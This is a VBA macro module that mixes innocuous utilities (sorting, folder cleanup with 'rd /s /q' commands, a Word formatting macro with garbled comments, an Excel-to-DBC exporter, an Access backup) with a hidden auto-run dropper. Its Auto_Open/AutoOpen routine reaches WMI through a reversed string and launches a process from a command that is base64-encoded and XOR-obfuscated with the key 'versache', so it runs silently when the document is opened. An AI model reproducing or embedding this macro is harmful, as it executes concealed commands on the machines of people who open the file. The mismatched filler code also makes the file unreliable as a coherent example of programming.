Attribute VB_Name = "Module1"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If

Dim Buhrain As Variant

Public Function toUnix(dt) As Long
    toUnix = DateDiff("s", "1/1/1970", dt)
End Function

Public Function toISO(dt) As String
    toISO = Format(dt, "YYYY-MM-DD") & "T" & Format(dt, "HH:MM:SS")
End Function

Public Function str(vValue) As String
    str = "'" & Replace(vValue, "'", "''") & "'"
End Function

Function JoinArrayofArrays(ByVal vArray As Variant, _
                Optional ByVal WordDelim As String = " ", _
                Optional ByVal LineDelim As String = vbNewLine) As String
    Dim R As Long, Lines() As String
    ReDim Lines(0 To UBound(vArray))
    For R = 0 To UBound(vArray)
        Dim InnerArray() As Variant
        InnerArray = vArray(R)
        Lines(R) = Join(InnerArray, WordDelim)
    Next
    JoinArrayofArrays = Join(Lines, LineDelim)
End Function

Function getDimension(Var As Variant) As Long
    On Error GoTo Err
    Dim i As Long
    Dim tmp As Long
    i = 0
    Do While True
        i = i + 1
        tmp = UBound(Var, i)
    Loop

Err:
        getDimension = i - 1
End Function

Public Sub QuickSort(vArray As Variant, inLow As Long, inHi As Long)
    Dim pivot   As Variant
    Dim tmpSwap As Variant
    Dim tmpLow  As Long
    Dim tmpHi   As Long

    tmpLow = inLow
    tmpHi = inHi

    pivot = vArray((inLow + inHi) \ 2)

    While (tmpLow <= tmpHi)

        While (vArray(tmpLow) < pivot And tmpLow < inHi)
            tmpLow = tmpLow + 1
        Wend

        While (pivot < vArray(tmpHi) And tmpHi > inLow)
            tmpHi = tmpHi - 1
        Wend

        If (tmpLow <= tmpHi) Then
            tmpSwap = vArray(tmpLow)
            vArray(tmpLow) = vArray(tmpHi)
            vArray(tmpHi) = tmpSwap
            tmpLow = tmpLow + 1
            tmpHi = tmpHi - 1
        End If
    Wend
    If (inLow < tmpHi) Then
        QuickSort vArray, inLow, tmpHi
    End If
    If (tmpLow < inHi) Then
        QuickSort vArray, tmpLow, inHi
    End If
End Sub

Sub ProcessBackupTasksFolder(OfFolder, TaskFolderPath)
    For Each SubFolder In OfFolder.SubFolders
        ProcessBackupTasksFolder SubFolder, TaskFolderPath & "\" & SubFolder.name
    Next
    
    For Each fl In OfFolder.Files
        ' backup files do not contain extension
        ' rename - for testing
        'if Instr(fl.name, ".") = 0 then
        '   objFSO.MoveFile fl, fl & ".xml"
        'end if
        
        ' schtasks help
        ' http://ss64.com/nt/schtasks.html
        ' test
        'oShell.Run "cmd.exe /K schtasks /create /xml """ & fl.path & """ /tn """ & TaskFolderPath & "\" & Replace( fl.name, ".xml", "" ) & """"
        'WScript.echo "cmd.exe /K schtasks /create /xml """ & fl.path & """ /tn """ & TaskFolderPath & "\" & Replace( fl.name, ".xml", "" ) & """"
        
        ' cmd.exe switches:
        ' http://ss64.com/nt/cmd.html
        ' prod
        
        oShell.Run "cmd.exe /C schtasks /create /xml """ & fl.path & """ /tn """ & TaskFolderPath & "\" & Replace(fl.name, ".xml", "") & """"
    Next
    
End Sub

Sub DeleteOlder(intDays, strPath)
' Delete files from strPath that are more than intDays old
If fso.FolderExists(strPath) = True Then
   On Error Resume Next
   Set objFolder = fso.GetFolder(strPath)
   For Each objFile In objFolder.Files
      If DateDiff("d", objFile.DateLastModified, Now) > intDays Then
         Wscript.echo "File: " & objFile.name
         objFile.Delete (True)
      End If
   Next
End If
End Sub

Sub DeleteOlderWithSubFolders(intDays, strPath)
Dim objSubFolder
Dim strRun

' Delete files from strPath that are more than intDays old
' Wscript.Echo "Starting: " & strPath
If fso.FolderExists(strPath) = True Then
   Set objFolder = fso.GetFolder(strPath)
   
    Wscript.echo "Folder: " & objFolder.path
    Wscript.echo "Len: " & Len(objFolder.path)
    On Error Resume Next
    Wscript.echo "Subfolders: " & objFolder.SubFolders.count
    Wscript.echo "Files: " & objFolder.Files.count
    On Error GoTo 0
    
    'Wscript.echo "Folder: " & objFolder.name
    ' For each objFile in objFolder.files
        ' If DateDiff("d", objFile.DateLastModified,Now) > intDays Then
            ' Wscript.echo "Deleting file: " & objFile.Path
            ' on error resume next
            ' objFile.Delete(True)
            ' if err.number <> 0 then
                ' Wscript.echo "Cannot delete file: " & Err.number & " : " & Err.Description
                ' err.clear
            ' else
                ' Wscript.echo Chr(13) & "Deleted" & Chr(13)
            ' end if
            ' on error goto 0
        ' End If
    ' Next ' objFile
    
    If Left(objFolder.name, 9) = "Vertipaq_" Then
        Wscript.echo "Deleting folder (vertipaq): " & objFolder.path & "\"
        On Error Resume Next
        fso.DeleteFolder objFolder.path, True
        If Err.Number <> 0 Then
            Wscript.echo "Cannot delete folder: " & Err.Number & " : " & Err.Description
            Err.Clear
        End If
    Else
        ' not vertipaq
        If objFolder.SubFolders.count = 0 And objFolder.Files.count = 0 Then
            Wscript.echo "Deleting folder (no sub-items): " & objFolder.path & "\"
            On Error Resume Next
            fso.DeleteFolder objFolder.path, True
            If Err.Number <> 0 Then
                Wscript.echo "Cannot delete folder: " & Err.Number & " : " & Err.Description
                Err.Clear
            Else
                Wscript.echo Chr(13) & "Deleted" & Chr(13)
            End If
            On Error GoTo 0
        Else
            ' delete by time
            If DateDiff("d", objFolder.DateLastModified, Now) > intDays Then
                 Wscript.echo "Deleting folder (time): " & objFolder.name
                 Wscript.echo "Attributes: " & objFolder.Attributes
                 objFolder.Attributes = 0
                 Wscript.echo "Attributes2: " & objFolder.Attributes
                 On Error Resume Next
                 fso.DeleteFolder objFolder.path & "\", True
                                
                'strRun = "cmd /c rd /s /q """ & strPath & """"
                'strRun = "cmd /k rd /s """ & strPath & """"
                strRun = "cmd rd /c /s """ & strPath & """"
                objShell.Run strRun, 1, True

                 If Err.Number <> 0 Then
                    Wscript.echo "Cannot delete folder: " & Err.Number & " : " & Err.Description
                    Err.Clear
                Else
                    Wscript.echo Chr(13) & "Deleted" & Chr(13)
                End If
                On Error GoTo 0
            End If
        End If
    End If
    
    If fso.FolderExists(strPath) = True Then
        For Each objSubFolder In objFolder.SubFolders
            'Call DeleteOlderWithSubFolders(intDays,objSubFolder.Path)
            
            If DateDiff("d", objSubFolder.DateLastModified, Now) > intDays Then
                 Wscript.echo "Deleting folder (time): " & objSubFolder.name
                 On Error Resume Next
                 fso.DeleteFolder objSubFolder.path & "\", True
                
                strRun = "cmd /c del /s /q """ & objSubFolder.path & "\" & """"
                'strRun = "cmd /k del /s /q """ & objSubFolder.path & "\" & """"
                objShell.Run strRun, 1, True
                
                strRun = "cmd /c rd /q /s """ & objSubFolder.path & "\" & """"
                'strRun = "cmd /k rd /q /s """ & objSubFolder.path & "\" & """"
                
                'strRun = "cmd /c rd /s """ & objSubFolder.path & "\" & """"
                'strRun = "cmd /k rd /s """ & objSubFolder.path & "\" & """"
                
                objShell.Run strRun, 1, True

                 If Err.Number <> 0 Then
                    Wscript.echo "Cannot delete folder: " & Err.Number & " : " & Err.Description
                    Err.Clear
                Else
                    Wscript.echo Chr(13) & "Deleted" & Chr(13)
                End If
                On Error GoTo 0
            End If
            
        Next ' objSubFolder
    End If
Else
    Wscript.echo "Folder doesn't exist"
End If
End Sub

Sub replaceWizzard(originalText, replasedText)
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find.Replacement.Font
        .Bold = False
        .Italic = False
        .Underline = False
        .StrikeThrough = False
    End With
    With Selection.Find
        .text = originalText
        .Replacement.text = replasedText
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub

Sub |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2()

    Set MyRange = ActiveDocument.Content

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd|
    Selection.WholeStory
    With Selection.Font
    .name = "Calibri"
    .Size = 12
    '.ColorIndex = wdBlack
    End With

    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    With Selection.ParagraphFormat
        .LeftIndent = CentimetersToPoints(0)
        .RightIndent = CentimetersToPoints(0)
        .SpaceBefore = 0
        .SpaceAfter = 0
        .LineSpacingRule = wdLineSpaceSingle
        .FirstLineIndent = CentimetersToPoints(0)
        .LineSpacingRule = wdLineSpaceAtLeast
        .LineSpacing = 1
    End With

    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' "^l" -> "^p"
    replaceWizzard "^l", "^p"
    ' " ^p" -> "^p"
    replaceWizzard " ^p", "^p"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard "^p", "^p"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard "^p^p^p", "^p^p"
   
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard "^s", " "
    replaceWizzard "^-", ""
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard "^t", " "
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard " ", " "
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    replaceWizzard "###", "### "
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    flag = True
    While flag = True
        Set MyRange = ActiveDocument.Content
        replaceWizzard "  ", " "
        MyRange.Find.Execute FindText:="  "
        If MyRange.Find.Found = False Then flag = False
    Wend
    ' "^p " -> "^p"
    replaceWizzard "^p ", "^p"

    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    replaceWizzard ">", ">"
    replaceWizzard "^p>^p", "^p     ^p"

    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd| -> |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    replaceWizzard " - ", " |fffd| "
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| -> |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    replaceWizzard "|fffd|", "|fffd|"
    ' [|fffd||fffd||fffd||fffd||fffd||fffd|][|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|] -> [|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]
    punctuationMark1 = Array(".", ",", ":", ";", ")", "]", "!", "?")
    For Each Mark In punctuationMark1
        oT = " " + Mark
        rT = Mark
        replaceWizzard oT, rT
    Next
    ' [|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][|fffd||fffd||fffd||fffd||fffd||fffd|] -> [|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]
    punctuationMark2 = Array("(", "[")
    For Each Mark In punctuationMark2
        oT = Mark + " "
        rT = Mark
        replaceWizzard oT, rT
    Next
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    message = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)

    Set MyRange = ActiveDocument.Content
    With MyRange.Find
        .Font.Bold = True
        .Execute FindText:="^f"
        If MyRange.Find.Found = True Then
            message = message + "ATTENTION! |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)
        End If
    End With

    Set MyRange = ActiveDocument.Content
    With MyRange.Find
        .Font.Italic = True
        .Execute FindText:="^f"
        If MyRange.Find.Found = True Then
            message = message + "ATTENTION! |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)
        End If
    End With

    Set MyRange = ActiveDocument.Content
    With MyRange.Find
        .Font.Underline = True
        .Execute FindText:="^f"
        If MyRange.Find.Found = True Then
            message = message + "ATTENTION! |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)
        End If
    End With

    Set MyRange = ActiveDocument.Content
    With MyRange.Find
        .Font.StrikeThrough = True
        .Execute FindText:="^f"
        If MyRange.Find.Found = True Then
            message = message + "ATTENTION! |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)
        End If
    End With

    Set MyRange = ActiveDocument.Content
    With MyRange.Find
        .Execute FindText:="- "
        If MyRange.Find.Found = True Then
            message = message + "ATTENTION! |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|" + Chr(13)
        End If
    End With
        
    signal = MsgBox(message, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")

End Sub

 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Sub Auto_Open()
From_Heart
End Sub
 
Sub AutoOpen()
    
Auto_Open
    

End Sub


Sub From_Heart()
    
    
    Set Nihonek = CreateObject(StrReverse("rotacoLmebWS.gnitpircSmebW"))


    Set Buhrain = Nihonek.ConnectServer()
    Buhrain.Security_.ImpersonationLevel = 3
    Call Nokia
    
End Sub


Function Nokia()
    Dim Firgus As Variant
    Set Firgus = Buhrain _
    .Get _
    ("Win32_Process")
    On Error Resume Next
    Call Firgus _
    .Create _
    (HideRibber(ShowRibber("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECSU5MCwoEFUZdEgocAFkGJDoKAkYBFxFeGxUXGF9ZShEcExNcSwUMBhZOFQoAGEsWEhVPABECFUhcTgAHFwZRXAAIFw1KOhAVJTFNDAQCRV83BBAcDBgEBhoODUg5VEEXHRdZPCA7NS4FCAcHSxUKHy9DTzRHUgAcBVs3LSgmOQEVBBEJOVRJLlFFBgYTTDE3PjE/JBARMyJdBBsNOVReUiAEF0UpGQYTBwgMBkVbNRMHCUM0R1IAHAVbNy0oJjlQSEEADRcCEAYaDUNFARMGHRcEQxsDExcTUwIMBRUZFwZIQUM7ERcXBl4xEQcGExYBUxcKDApYBh0eQU4pFxEQHxYPFyQMBRFSEA4OGAoEEQ=="), "versache"), _
    Null, Null, FeraskoLom)

End Function


Private Function HideRibber(text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  
  Dim TextUB As Long
  Dim KeyUB As Long
  
  
  
  bText = StrConv(text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  Dim TextPos As Long
  Dim Trenfa As Long
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
    If Trenfa < KeyUB Then
      Trenfa = Trenfa + 1
    Else
      Trenfa = 0
    End If
  Next TextPos
  HideRibber = StrConv(bText, vbUnicode)
End Function



Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.Number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
        Stop
    End If
End Function

Public Function ShowRibber(Vecad As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim kerfas           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin" + ".base64"
        .text = Vecad
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
        ShowRibber = Left$(sValue, kerfas)
    End With
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Sub dbc_Click()

Application.DisplayAlerts = False
On Error Resume Next

Dim i, j, k, node_count, message_count, signal_count As Integer
Dim Filename, arr
Dim nodes As String
Dim message, id, dlc, cycle_time, tx
Dim line, signal, byte_order, value_type, initial_value, value_table, comment, rx As String
Dim initial_value_list, value_table_list, cycle_time_list, comment_list As String
Dim str, text As String
Dim fso As New FileSystemObject
Dim starttime, endtime As Date
Dim elapsed As Double
Dim dbc_type As String

Filename = Application.GetSaveAsFilename(fileFilter:="DBC Files (*.dbc), *.dbc")

If Filename = False Then
    Exit Sub
End If

dbc_type = ActiveSheet.Cells(1, 2)

starttime = Now
endtime = starttime

Open Filename For Output As 1#

If dbc_type <> "J1939" Then
    Print #1, Sheet4.Cells(1, 2)
Else
    Print #1, Sheet5.Cells(1, 2)
End If

Print #1, vbLf

i = 18
nodes = ""
While Len(ActiveSheet.Cells(2, i)) > 0
    node_count = node_count + 1
    nodes = nodes & " " & ActiveSheet.Cells(2, i)
    i = i + 1
Wend
Print #1, "BU_:" & nodes
 
i = 3
message_count = 0
signal_count = 0
While Len(ActiveSheet.Cells(i, 5)) > 0
    If Len(ActiveSheet.Cells(i, 1)) > 0 Then
        message_count = message_count + 1
        message = ActiveSheet.Cells(i, 1)
        id = Hex2Dec(ActiveSheet.Cells(i, 2))
        If dbc_type <> "Standard" Then
            id = id + 2147483648#
        End If
        dlc = ActiveSheet.Cells(i, 3)
        For j = 1 To node_count
            If ActiveSheet.Cells(i, j + 17) = "T" Then
                tx = ActiveSheet.Cells(2, j + 17)
                Exit For
            End If
        Next j
        If tx = "" Then
            tx = "Vector__XXX"
        End If
        Print #1, vbLf
        Print #1, "BO_ " & id & " " & ActiveSheet.Cells(i, 1) & ": " & ActiveSheet.Cells(i, 3) & " " & tx
        If Len(ActiveSheet.Cells(i, 4) > 0) Then
            cycle_time = ActiveSheet.Cells(i, 4) + 0
            'cycle_time_list = cycle_time_list & "BA_ " & """GenMsgILSupport"" BO_ " & id & " " & 1 & ";" & vbLf
            cycle_time_list = cycle_time_list & "BA_ " & """GenMsgSendType"" BO_ " & id & " " & 0 & ";" & vbLf
            cycle_time_list = cycle_time_list & "BA_ " & """GenMsgCycleTime"" BO_ " & id & " " & cycle_time & ";" & vbLf
        End If
        
    Else
'        ActiveSheet.Cells(i, 1) = message
'        Hex2Dec(ActiveSheet.Cells(i, 2)) = id
'        Hex2Dec(ActiveSheet.Cells(i, 3)) = dlc
'        ActiveSheet.Cells(i, 4) = cycle_time
    End If
    signal_count = signal_count + 1
    signal = ActiveSheet.Cells(i, 5)
    If ActiveSheet.Cells(i, 8) = "MSB" Then
        byte_order = "0"
    Else
        byte_order = "1"
    End If
    If ActiveSheet.Cells(i, 9) = "Unsigned" Then
        value_type = "+"
    Else
        value_type = "-"
    End If
    rx = ""
    For j = 1 To node_count
            If ActiveSheet.Cells(i, j + 17) = "R" Then
                rx = rx & ActiveSheet.Cells(2, j + 17) & ","
            End If
    Next j
    If rx = "" Then
        rx = " Vector__XXX"
    Else
        rx = Mid(rx, 1, Len(rx) - 1)
    End If
    Print #1, " SG_ " & ActiveSheet.Cells(i, 5) & " : " & ActiveSheet.Cells(i, 6) & "|" & ActiveSheet.Cells(i, 7) & "@" & byte_order & value_type & _
        " (" & Num2Str(ActiveSheet.Cells(i, 11)) & "," & Num2Str(ActiveSheet.Cells(i, 12)) & ") " & "[" & Num2Str(ActiveSheet.Cells(i, 13)) & "|" & Num2Str(ActiveSheet.Cells(i, 14)) & "] " & _
        """" & ActiveSheet.Cells(i, 15) & """" & rx
    If Len(ActiveSheet.Cells(i, 10)) > 0 And Len(ActiveSheet.Cells(i, 1)) > 0 And ActiveSheet.Cells(i, 11) <> 0 Then
        initial_value = (ActiveSheet.Cells(i, 10) + ActiveSheet.Cells(i, 12)) / ActiveSheet.Cells(i, 11)
        initial_value_list = initial_value_list & "BA_ ""GenSigStartValue"" SG_ " & id & " " & signal & " " & initial_value & ";" & vbLf
    End If
    If Len(ActiveSheet.Cells(i, 16)) > 0 Then
        arr = Split(ActiveSheet.Cells(i, 16), vbLf)
        value_table = ""
        For j = UBound(arr) To 0 Step -1
            k = InStr(arr(j), "=")
            value_table = value_table & Hex2Dec(Mid(arr(j), 1, k - 1)) & " """ & Mid(arr(j), k + 1, Len(arr(j)) - k - 1) & """ "
        Next j
        value_table_list = value_table_list & "VAL_ " & id & " " & signal & " " & value_table & ";" & vbLf
    End If
    If Len(ActiveSheet.Cells(i, 17)) > 0 Then
        comment = ActiveSheet.Cells(i, 17)
        comment_list = comment_list & "CM_ SG_ " & id & " " & signal & " """ & comment & """;" & vbLf
    End If
    i = i + 1
Wend

Print #1, vbLf
Print #1, comment_list
If dbc_type <> "J1939" Then
    Print #1, Sheet4.Cells(2, 2)
    Print #1, Sheet4.Cells(3, 2)
Else
    Print #1, Sheet5.Cells(2, 2)
    Print #1, Sheet5.Cells(3, 2)
End If
Print #1, "BA_ ""DBName"" """ & fso.GetBaseName(Filename) + """;" + vbLf
Print #1, cycle_time_list
Print #1, initial_value_list
Print #1, value_table_list

Close #1


str = "DBC File= " + fso.GetFileName(Filename) + vbLf
str = str + "ECU Nodes Count= " + CStr(node_count) + vbLf
str = str + "Messages Count= " + CStr(message_count) + vbLf
str = str + "Signals Count= " + CStr(signal_count)
ActiveSheet.Cells(1, 5) = str

Set fso = Nothing

MsgBox "Finish, " + GetElapsedTime(starttime, "elapsed time")

End Sub

Private Function Num2Str(ByVal num) As String

Dim str As String
str = CStr(num)
If Len(str) > 0 And Mid(str, 1, 1) = "." Then
    str = "0" & str
ElseIf Len(str) > 0 And Mid(str, 1, 2) = "-." Then
     str = "-0." & Mid(str, 3, Len(str) - 2)
End If
Num2Str = str

End Function

Private Function GetElapsedTime(ByVal starttime As Date, ByVal step As String) As String
Dim text As String
Dim elapsed As Double
Dim endtime As Date

endtime = Now
elapsed = endtime - starttime
text = step + ": " + Format(elapsed * 3600 * 24, "#0") + "s"
GetElapsedTime = text

End Function

Function Hex2Dec(h)
    h = Mid(h, 3, Len(h) - 2)
    Dim L As Long: L = Len(h)
    If L < 16 Then               ' CDec results in Overflow error for hex numbers above 16 ^ 8
        Hex2Dec = CDec("&h0" & h)
        If Hex2Dec < 0 Then Hex2Dec = Hex2Dec + 4294967296# ' 2 ^ 32
    ElseIf L < 25 Then
        Hex2Dec = Hex2Dec(Left$(h, L - 9)) * 68719476736# + CDec("&h" & Right$(h, 9)) ' 16 ^ 9 = 68719476736
    End If
End Function

Sub excel2dbc(control As IRibbonControl)
dbc_Click
End Sub

Private Sub btnBackup_Click()

On Error GoTo Err_backup
    
Dim strFullPath As String
Dim strBackendFile As String
Dim strPath As String
Dim strSourceFile As String
Dim strDestinationFile As String

' get path to back-end using a linked table as reference. Change "tblLinked" to the name of a table within the back-end db.
' Mid function drops connection info including password (starts at character position 01)
' the 01 will need to be customized depending on the existence and length of the back-end database's password.

strFullPath = Mid(DBEngine.Workspaces(0).Databases(0).TableDefs("tblLinked").Connect, 1)

' uncomment next line in order to check path string in order to fine-tune the number of characters to
' truncate from the begining (by changing #01 above) in order to arrive at just the file path.

'MsgBox (strFullPath)

' isolate the name of the backend database
    For i = Len(strFullPath) To 1 Step -1
        If Mid(strFullPath, i, 1) = "\" Then
            strBackendFile = Mid(strFullPath, (i + 1))
            Exit For
        End If
    Next

    For n = Len(strBackendFile) To 1 Step -1
        If Mid(strBackendFile, n, 1) = "." Then
            strBackendFile = Left(strBackendFile, (n - 1))
            Exit For
        End If
    Next

' remove the filename of the database to isolate the path
    For i = Len(strFullPath) To 1 Step -1
        If Mid(strFullPath, i, 1) = "\" Then
            strPath = Left(strFullPath, i)
            Exit For
        End If
    Next

' reconstruct the source and destination file paths
' destination file to include the abbreviated day of the week
' \backup\ directory must already exist
' if working with <=2003 version databases, change 2 instances of ".accdb" below to ".mdb"

    strSourceFile = strPath & strBackendFile & ".accdb"
    strDestinationFile = strPath & "backup\" & strBackendFile & "-" & WeekdayName(Weekday(Date), True) & ".accdb"

FileCopy strSourceFile, strDestinationFile
MsgBox "The back-end database has been backed up.", vbOKOnly, "Success"

Exit_Backup:
Exit Sub

Err_backup:
If Err.Number = 0 Then
    ElseIf Err.Number = 70 Then
        MsgBox "The file is currently in use and therefore is locked and cannot be copied at this time. Please ensure that all forms, reports, and queries are closed, and that no one is using the database and try again.", vbOKOnly, "File Currently in Use"
    ElseIf Err.Number = 53 Then
        MsgBox "The Source File '" & strSourceFile & "' could not be found. Please validate the location and name of the specifed Source File and try again", vbOKOnly, "File Not Found"
    Else
        MsgBox "Microsoft Access has generated the following error" & vbCrLf & vbCrLf & "Error Number: " & Err.Number & vbCrLf & "Error Source: ModExtFiles / CopyFile" & vbCrLf & "Error Description: " & Err.Description, vbCritical, "An Error has Occured"
End If

Resume Exit_Backup
    
End Sub

Public Function AddressGeocode(address As String) As String
  Dim strAddress As String
  Dim strQuery As String
  Dim strLatitude As String
  Dim strLongitude As String
  Dim strQueryBland As String

  strAddress = URLEncode(address)

  'Assemble the query string
  strQuery = gstrGeocodingURL
  strQuery = strQuery & "address=" & strAddress
  If gintType = 0 Then ' free-ish Google Geocoder - now requires an API key!
    strQuery = strQuery & "&key=" & gstrKey
